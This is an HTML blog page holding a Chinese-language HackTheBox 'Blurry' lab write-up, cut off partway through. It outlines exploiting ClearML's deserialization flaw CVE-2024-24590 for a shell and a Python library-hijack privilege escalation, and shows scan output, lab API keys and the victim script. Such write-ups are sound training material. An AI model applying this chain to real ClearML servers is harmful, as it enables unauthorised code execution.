@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Blurry首先進入了其 80 端口，發現頁面直接跳轉至 http:&#x2F;&#x2F;app.blurry.htb&#x2F; ，隨後注意到該應用似乎與 ClearML 相關，這是一個機器學習">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Blurry">
+<meta property="og:url" content="https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Blurry首先進入了其 80 端口，發現頁面直接跳轉至 http:&#x2F;&#x2F;app.blurry.htb&#x2F; ，隨後注意到該應用似乎與 ClearML 相關，這是一個機器學習">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609150858-oel8ud7.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609150922-2y0janp.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609151052-drfjma2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609151126-pbq60ji.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609151214-0ffibkz.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609151231-nulyfr2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609151450-im1qlyn.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609151516-7hjtt41.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609151707-4ts1a6j.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609151827-raxqia1.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609152050-krdbemw.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609152222-gz0lygv.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240610175652-0h9xl9q.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609153608-g957puw.png">
+<meta property="article:published_time" content="2024-06-10T10:35:00.000Z">
+<meta property="article:modified_time" content="2024-10-12T18:00:45.850Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609150858-oel8ud7.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Blurry</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/06/13/2024/0613-htb-dante/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/06/10/2024/0610-htb-zephyr/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&text=HackTheBox - Machine - Blurry"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&title=HackTheBox - Machine - Blurry"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&is_video=false&description=HackTheBox - Machine - Blurry"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Blurry&body=Check out this article: https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&title=HackTheBox - Machine - Blurry"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&title=HackTheBox - Machine - Blurry"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&title=HackTheBox - Machine - Blurry"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&title=HackTheBox - Machine - Blurry"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&name=HackTheBox - Machine - Blurry&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/06/10/2024-htb-machine/23-Blurry/&t=HackTheBox - Machine - Blurry"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Blurry
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-06-10T10:35:00.000Z" class="dt-published" itemprop="datePublished">2024-06-10</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="Blurry"><a href="#Blurry" class="headerlink" title="Blurry"></a>Blurry</h1><p>首先進入了其 80 端口，發現頁面直接跳轉至 <a target="_blank" rel="noopener" href="http://app.blurry.htb/">http://app.blurry.htb/</a> ，隨後注意到該應用似乎與 ClearML 相關，這是一個機器學習的數據管理工具。註冊過程中，最初遇到了一些錯誤，但通過檢查 API 地址發現需將其修改為 <a target="_blank" rel="noopener" href="http://app.blurry.htb/api">http://app.blurry.htb/api</a> ，隨後成功進入應用。在此過程中，觀察到一個名為 Chad Jippity 的用戶正在運行腳本，並且這些腳本的結果會自動記錄到遠程 ClearML 服務器上。進一步調查後，發現 ClearML 的 Python 庫存在漏洞，特別是 CVE-2024-24590，這使得用戶在調用 <code>task.artifacts.get()</code> 時可能觸發反序列化漏洞。此漏洞可被利用來上傳一個特製的物件，進而執行任意代碼。當成功上傳物件後，便能在網頁上看到解析的 <code>RunCommand</code> 類，等待用戶執行 <code>task.artifacts.get()</code> 時即可獲得 shell 訪問權限。接著，進一步分析發現 <code>/usr/bin/evaluate_model</code> 的腳本中調用了 <code>/models/evaluate_model.py</code> ，並且該目錄具有寫入權限，這使得可以利用 Python 庫劫持技術來獲得 root 權限。此時，即使無法直接修改文件，仍然可以刪除並重新寫入一個 shell 程序，從而達成提權目的。</p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     syn<span class="literal">-ack</span> ttl <span class="number">63</span> OpenSSH <span class="number">8.4</span>p1 Debian <span class="number">5</span>+deb11u3 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>: </span><br><span class="line">|   <span class="number">3072</span> <span class="number">3</span>e:<span class="number">21</span>:d5:dc:<span class="number">2</span>e:<span class="number">61</span>:eb:<span class="number">8</span>f:a6:<span class="number">3</span>b:<span class="number">24</span>:<span class="number">2</span>a:b7:<span class="number">1</span>c:<span class="number">05</span>:d3 (RSA)</span><br><span class="line">| ssh<span class="literal">-rsa</span> AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/<span class="number">17</span>+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=</span><br><span class="line">|   <span class="number">256</span> <span class="number">39</span>:<span class="number">11</span>:<span class="number">42</span>:<span class="number">3</span>f:<span class="number">0</span>c:<span class="number">25</span>:<span class="number">00</span>:<span class="number">08</span>:d7:<span class="number">2</span>f:<span class="number">1</span>b:<span class="number">51</span>:e0:<span class="number">43</span>:<span class="number">9</span>d:<span class="number">85</span> (ECDSA)</span><br><span class="line">| ecdsa<span class="literal">-sha2-nistp256</span> AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=</span><br><span class="line">|   <span class="number">256</span> b0:<span class="number">6</span>f:a0:<span class="number">0</span>a:<span class="number">9</span>e:df:b1:<span class="number">7</span>a:<span class="number">49</span>:<span class="number">78</span>:<span class="number">86</span>:b2:<span class="number">35</span>:<span class="number">40</span>:ec:<span class="number">95</span> (ED25519)</span><br><span class="line">|_ssh<span class="literal">-ed25519</span> AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/<span class="number">3</span></span><br><span class="line"><span class="number">80</span>/tcp open  http    syn<span class="literal">-ack</span> ttl <span class="number">63</span> nginx <span class="number">1.18</span>.<span class="number">0</span></span><br><span class="line">| http<span class="literal">-methods</span>: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http<span class="literal">-server-header</span>: nginx/<span class="number">1.18</span>.<span class="number">0</span></span><br><span class="line">|_http<span class="literal">-title</span>: Did not follow redirect to http://app.blurry.htb/</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<p>經典的一個80端口。</p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>一打開ip會直接跳轉到：​<code>http://app.blurry.htb/</code>​</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> ffuf <span class="literal">-u</span> <span class="string">&quot;http://10.129.32.150&quot;</span>  <span class="literal">-H</span> <span class="string">&quot;Host: FUZZ.blurry.htb&quot;</span> <span class="literal">-w</span> /Tools/Wordlists/SecLists/Discovery/DNS/bitquark<span class="literal">-subdomains-top100000</span>.txt <span class="literal">-fs</span> <span class="number">169</span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\     </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/     </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\    </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/    </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\     </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.0.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.129.32.150</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /Tools/Wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.blurry.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 169</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 119ms]</span></span><br><span class="line"><span class="string">    * FUZZ: app</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 298ms]</span></span><br><span class="line"><span class="string">    * FUZZ: files</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 200, Size: 218733, Words: 12692, Lines: 449, Duration: 244ms]</span></span><br><span class="line"><span class="string">    * FUZZ: chat</span></span><br></pre></td></tr></table></figure>
+
+<p>然後有三個subdomain，來到app這個domain：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609150858-oel8ud7.png" alt="image">​</p>
+<p>隨便填入一個名字看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609150922-2y0janp.png" alt="image">​</p>
+<p>看起來是clearml，clearml你可以理解成是機器學習的pastebin。</p>
+<p>按照他的方法注冊了一下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> pip install clearml</span><br><span class="line"><span class="variable">$</span> clearml<span class="literal">-init</span></span><br></pre></td></tr></table></figure>
+
+<p>一開始的時候我怎麽填都顯示錯誤，然後按F12看到原來api的地址改了</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609151052-drfjma2.png" alt="image">​</p>
+<p>‍</p>
+<p>所以改成如下圖：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609151126-pbq60ji.png" alt="image">​</p>
+<p>‍</p>
+<p>把 <code>api_server</code>​ 改成 <code>http://app.blurry.htb/api</code>​ 即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">api &#123;</span><br><span class="line">  web_server: http://app.blurry.htb</span><br><span class="line">  api_server: http://app.blurry.htb/api</span><br><span class="line">  files_server: http://files.blurry.htb</span><br><span class="line">  credentials &#123;</span><br><span class="line">    <span class="string">&quot;access_key&quot;</span> = <span class="string">&quot;CX2A899YJAOTM1SA8MUW&quot;</span></span><br><span class="line">    <span class="string">&quot;secret_key&quot;</span> = <span class="string">&quot;MWl4vXOqyKXCeQTQTqgICjOrYsMQlhsRs3FfwE2qVPkmtA6gQg&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是刷新了一個網頁突然看到有一個running顯示，觀察了下，每隔一段時間就會有東西在運行。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609151214-0ffibkz.png" alt="image">​</p>
+<p>我就好奇的點了進去：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/06-p08ayhQb6F96c4d3-Blurry/image-20240609151231-nulyfr2.png" alt="image">​</p>
+<p>從這裏你可以看到，儅有一個用戶在運行脚本，而且是使用clearml的框架下運行，你脚本的結果會自動記錄到遠程clearml的服務器上。</p>
+<p>所以從這裏你可以看到chad jippity 會每隔一段時間在本地運行一個脚本。</p>
+<p>脚本内容如下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line">from clearml import Task</span><br><span class="line">from multiprocessing import <span class="keyword">Process</span></span><br><span class="line">from clearml.backend_api.session.client import APIClient</span><br><span class="line"></span><br><span class="line">def process_json_artifact(<span class="keyword">data</span>, artifact_name):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    Process a JSON artifact represented as a Python dictionary.</span></span><br><span class="line"><span class="string">    Print all key-value pairs contained in the dictionary.</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    print(f<span class="string">&quot;[+] Artifact &#x27;&#123;artifact_name&#125;&#x27; Contents:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> data.items():</span><br><span class="line">        print(f<span class="string">&quot; - &#123;key&#125;: &#123;value&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">def process_task(task):</span><br><span class="line">    artifacts = task.artifacts</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> artifact_name, artifact_object <span class="keyword">in</span> artifacts.items():</span><br><span class="line">        <span class="keyword">data</span> = artifact_object.get()</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> isinstance(<span class="keyword">data</span>, dict):</span><br><span class="line">            process_json_artifact(<span class="keyword">data</span>, artifact_name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(f<span class="string">&quot;[!] Artifact &#x27;&#123;artifact_name&#125;&#x27; content is not a dictionary.&quot;</span>)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    review_task = Task.init(project_name=<span class="string">&quot;Black Swan&quot;</span>, </span><br><span class="line">                            task_name=<span class="string">&quot;Review JSON Artifacts&quot;</span>, </span><br><span class="line">                            task_type=Task.TaskTypes.data_processing)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Retrieve tasks tagged for review</span></span><br><span class="line">    tasks = Task.get_tasks(project_name=<span class="string">&#x27;Black 